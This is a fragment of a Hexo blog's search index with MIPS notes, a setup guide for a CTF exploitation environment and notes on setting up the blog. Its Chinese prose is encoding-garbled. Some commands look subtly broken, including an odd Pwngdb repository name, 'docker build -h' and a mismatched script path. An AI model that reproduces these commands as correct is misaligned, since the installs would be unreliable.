class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä»ç„¶ load, store</span></span><br><span class="line"><span class="comment"># b: byte; w: word; h: half word; ...</span></span><br><span class="line"><span class="keyword">sw: </span><span class="keyword">sw </span>$<span class="built_in">ra</span>, <span class="number">0x38</span>($<span class="built_in">sp</span>)   <span class="comment"># å°†$raå­˜å…¥æ ˆä¸­ $sp+38çš„åœ°æ–¹</span></span><br><span class="line"><span class="keyword">sb: </span>...</span><br><span class="line"><span class="keyword">lw: </span>...</span><br><span class="line"><span class="keyword">lb: </span>...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¾‹å­</span></span><br><span class="line"><span class="keyword">sb </span>r1, <span class="number">0</span>(R2)</span><br><span class="line"><span class="keyword">lb </span>r1, <span class="number">0</span>(r2)</span><br></pre></td></tr></table></figure><ul><li>ç®—æœ¯</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; åŸºæœ¬ç®—æœ¯</span></span><br><span class="line"><span class="keyword">add</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sub</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; é€»è¾‘</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">xor</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">nor</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; ç§»ä½</span></span><br><span class="line"><span class="keyword">sll</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">srl</span></span><br></pre></td></tr></table></figure><ul><li>è·³è½¬</li></ul><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; jmp</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jmp </span>label</span><br><span class="line"><span class="keyword">jr: </span>ç”¨æ³• <span class="keyword">jr </span>$<span class="built_in">ra</span> ç­‰</span><br><span class="line"><span class="keyword">jal: </span><span class="keyword">jmp </span><span class="keyword">and </span>link, ä¿å­˜ ret <span class="keyword">addr(pc+4) </span>åˆ° $<span class="built_in">ra</span></span><br><span class="line"><span class="keyword">jalr: </span>å€Ÿç”¨å¯„å­˜å™¨è·³è½¬ï¼Œé“¾æ¥ï¼Œå¸¸ç”¨</span><br><span class="line"></span><br><span class="line"><span class="comment">; branch, åé¢éœ€è¦è·Ÿæ“ä½œ</span></span><br><span class="line"><span class="keyword">beq: </span><span class="keyword">beq </span>$s, $t, offset   <span class="comment"># $s=$tè·³è½¬</span></span><br><span class="line"><span class="keyword">bne: </span><span class="keyword">b </span>not eq</span><br><span class="line"><span class="keyword">bltz: </span><span class="keyword">branch </span>less than <span class="built_in">zero</span></span><br></pre></td></tr></table></figure><ul><li>æ¶æ„ç¼“å­˜<ul><li>æœ‰ä¸¤ä¸ªç‹¬ç«‹çš„cache: æŒ‡ä»¤ å’Œ æ•°æ®</li></ul></li></ul><h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p>xxx</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn init</title>
      <link href="/2023/06/05/Pwn%20init/"/>
      <url>/2023/06/05/Pwn%20init/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ­å»ºä¸€ä¸ªpwnç¯å¢ƒã€‚</p></blockquote><span id="more"></span><ul><li><code>apt</code> or <code>apt-get</code>? è™½ç„¶æˆ‘ä½¿ç”¨aptå‡ºç°warning,ä½†æ˜¯ä¾ç„¶èƒ½ç”¨<ul><li>åœ¨è„šæœ¬ä¸­ï¼Œæ›´åŠ æ¨è <code>apt-get</code></li><li><code>-y</code> yes é¿å…äº¤äº’è€Œäº§ç”Ÿé”™è¯¯</li></ul></li></ul><h3 id="VM-or-WSL"><a href="#VM-or-WSL" class="headerlink" title="VM or WSL"></a>VM or WSL</h3><blockquote><p>å®‰è£…å¿…å¤‡çš„åº”ç”¨</p></blockquote><ul><li>rootä¸‹ä½¿ç”¨ï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·æ— æ³•ä½¿ç”¨<code>gdbæ’ä»¶</code>åŠŸèƒ½ï¼Œå› ä¸ºgdbinitæ–‡ä»¶çš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å¤åˆ¶ä¸€ä»½åˆ°è‡ªå·±çš„ç”¨æˆ·ç›®å½•ä¸‹</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install -y patchelf</span><br><span class="line">apt-get install -y wget</span><br><span class="line">apt-get install -y zip</span><br><span class="line">apt-get install -y tzdata</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># pythonå·¥å…·</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># æ¢æºï¼Œå¯é€‰</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwngdb</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuapt-getx/Pwngdb.git </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># gemæº</span></span><br><span class="line">gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccomp-tools</span></span><br><span class="line">gem install seccomp-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget</span></span><br><span class="line">gem install one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwninit</span></span><br><span class="line">apt-get install liblzma-dev pkgconf</span><br><span class="line">apt-get install cargo</span><br><span class="line">cargo install pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker è‡ªå·±é€‰æ‹©</span></span><br><span class="line"><span class="comment"># apt-get install docker.io</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu è‡ªå·±é€‰æ‹©</span></span><br><span class="line"><span class="comment"># apt-get install qemu qemu-system qemu-user-static binfmt-support</span></span><br></pre></td></tr></table></figure><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><ul><li><p>æ­å»ºæ›´åŠ å®¹æ˜“</p></li><li><p>ç”±äºæŸäº›é¢˜ç›®æ²¡æœ‰Libcç‰ˆæœ¬ï¼Œè€Œæ˜¯ç»™å‡ºäº†Dockerfileã€‚æˆ–è€…è¯´ï¼Œä¸æƒ³ä¸‹è½½è™šæ‹Ÿæœºã€‚</p><ul><li>glibc-all-in-one ä¸‹è½½ä¸€ä¸ªlibc è¿›è¡Œpatch(ä½†æ˜¯<code>patchelf</code>å®¹æ˜“å¯¼è‡´ç¨‹åºç ´å).</li><li>è‡ªå·±çš„dockerç¯å¢ƒ</li></ul></li><li><p>dockerç¯å¢ƒæ­å»º: æ›´æ”¹VERSIONå°±è¡Œï¼Œç¦æ­¢äº¤äº’ã€‚</p></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ARG</span> VERSION=<span class="number">20.04</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:$VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND noninteractive </span><br><span class="line"><span class="comment"># ENV TZ=Asia/Shanghai</span></span><br><span class="line"><span class="comment">########## solve some error ##############</span></span><br><span class="line"><span class="comment"># å®šä¹‰æ—¶åŒºå‚æ•°</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># è®¾ç½®æ—¶åŒº</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># è®¾ç½®ç¼–ç </span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwninit.sh /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/pwninit.sh &amp;&amp; /root/pwninit</span></span><br></pre></td></tr></table></figure><ul><li>pwninit: åªéœ€è¦å®‰è£…éƒ¨åˆ†å·¥å…·</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># others</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># æ¢æºï¼Œå¯é€‰</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºä¸€ä¸ªå®¹å™¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -h &lt;repo&gt;:&lt;tag&gt; .</span><br><span class="line"><span class="comment"># -f æŒ‡å®šdockerfile</span></span><br><span class="line"><span class="comment"># repo å½¢å¼ xxx/xxx</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><ul><li>è¿›å…¥docker</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu:VERSION /bin/bash</span><br><span class="line"><span class="comment"># -v dir:dir å…±äº«æ–‡ä»¶å¤¹</span></span><br></pre></td></tr></table></figure><ul><li><p>docker å‘½ä»¤</p><ul><li>-i: äº¤äº’å¼</li><li>-t: terminl</li><li>-v hostDir:dockerDir å…±äº«æ–‡ä»¶å¤¹</li><li>ps -a: æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨</li></ul></li><li><p>åœæ­¢åé‡æ–°è®¡å…¥å®¹å™¨</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker start &lt;ID&gt;</span><br><span class="line">docker attach &lt;ID&gt;</span><br></pre></td></tr></table></figure><ul><li>åœæ­¢å®¹å™¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;ID&gt;</span><br></pre></td></tr></table></figure><ul><li>åˆ é™¤å®¹å™¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;ID&gt;</span><br></pre></td></tr></table></figure><ul><li>åˆ é™¤é•œåƒ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;ID&gt;</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™å¤„ç†"><a href="#æŠ¥é”™å¤„ç†" class="headerlink" title="æŠ¥é”™å¤„ç†"></a>æŠ¥é”™å¤„ç†</h4><ul><li>error 1</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">******</span><br><span class="line">Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.</span><br><span class="line">You might try launching gdb with:</span><br><span class="line">    LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb</span><br><span class="line">Make sure that en_US.UTF-8 is activated <span class="keyword">in</span> /etc/locale.gen and you called locale-gen</span><br><span class="line">******</span><br></pre></td></tr></table></figure><ul><li>error 2</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/gdbinit.py&quot;</span>, line 58, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pwndbg  <span class="comment"># noqa: F401</span></span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/__init__.py&quot;</span>, line 86, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    config_mod.init_params()</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 159, <span class="keyword">in</span> init_params</span><br><span class="line">    Parameter(p)</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 45, <span class="keyword">in</span> __init__</span><br><span class="line">    self.value = param.value</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br><span class="line"><span class="string">------- tip of the day (disable with set show-tips off) -------</span></span><br></pre></td></tr></table></figure><ul><li><p>å‡ºç°äº†å¦‚ä¸Šé”™è¯¯ã€‚å¯»æ‰¾åˆ°ä¸€ä¸ª<a href="https://github.com/pwndbg/pwndbg/issues/1539">issue</a></p></li><li><p>error1ï¼Œä¿®æ”¹dockerfileçš„ç±»ä¼¼å¦‚ä¸‹å˜é‡ã€‚é€‰æ‹©ä¸­å›½</p></li><li><p>error2  ä¹Ÿè§£å†³äº†ã€‚</p></li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ENV LANG en_US.utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ‘ä»¬çš„è®¾ç½®</span></span><br><span class="line"><span class="comment"># å®šä¹‰æ—¶åŒºå‚æ•°</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># è®¾ç½®æ—¶åŒº</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># è®¾ç½®ç¼–ç </span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><ul><li>åˆ›å»ºå¤šä¸ªdockerã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>init-blog</title>
      <link href="/2023/03/19/init-blog/"/>
      <url>/2023/03/19/init-blog/</url>
      
        <content type="html"><![CDATA[<blockquote><p>blog init</p></blockquote><span id="more"></span><h1 id="æ­å»ºåšå®¢"><a href="#æ­å»ºåšå®¢" class="headerlink" title="æ­å»ºåšå®¢"></a>æ­å»ºåšå®¢</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><ul><li>github + hexo</li></ul><!--more--><h3 id="hexoä½¿ç”¨"><a href="#hexoä½¿ç”¨" class="headerlink" title="hexoä½¿ç”¨"></a>hexoä½¿ç”¨</h3><ul><li><p><code>hexo</code> å‘½ä»¤æŠ¥é”™ï¼Œä¸Šç½‘æŸ¥ï¼Œä½¿ç”¨ <code>npx hexo</code></p></li><li><p>æ’ä»¶ä¸‹è½½</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><ul><li>å¸¸ç”¨å‘½ä»¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">npx hexo init <span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªä»“åº“</span></span><br><span class="line">npx hexo clean</span><br><span class="line">npx hexo g   <span class="comment"># é™æ€ç•Œé¢ç”Ÿæˆ</span></span><br><span class="line">npx hexo s   <span class="comment"># æœ¬åœ°å¯åŠ¨ service</span></span><br><span class="line">npx hexo d   <span class="comment"># æ’ä»¶ã€‚ä¼ åˆ°github</span></span><br><span class="line"></span><br><span class="line">npx hexo new page &lt;name&gt; <span class="comment"># ç”Ÿæˆç›®å½•</span></span><br><span class="line">npx hexo new &lt;name&gt;.md   <span class="comment">#ç”Ÿæˆæ–‡ç« </span></span><br></pre></td></tr></table></figure><ul><li>å¸¸ç”¨å±æ€§</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title: æ ‡é¢˜ï¼Œ ä½¿ç”¨ &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="built_in">date</span>: æ—¥æœŸ, ä½¿ç”¨ &#123;&#123;<span class="built_in">date</span>&#125;&#125;</span><br><span class="line">updated: æ›´æ–°</span><br><span class="line">tags: æ ‡ç­¾</span><br><span class="line">categories: åˆ†ç±»</span><br><span class="line">comments: å¼€å¯è¯„è®º <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h3><ul><li>obsidian å†™md</li><li>vscode</li></ul><h2 id="æŒç»­å­¦ä¹ "><a href="#æŒç»­å­¦ä¹ " class="headerlink" title="æŒç»­å­¦ä¹ "></a>æŒç»­å­¦ä¹ </h2><ul><li>ç®€å•ç‚¹ä¹Ÿè¿˜è¡Œï¼Œä¸æƒ³æŠ˜è…¾äº†ã€‚</li><li>å®˜ç½‘ + googleï¼Œæ»¡è¶³ä¸€åˆ‡è¦æ±‚</li></ul><p><a href="https://hexo.io/zh-cn/docs/">ä¸­æ–‡æ–‡æ¡£</a></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
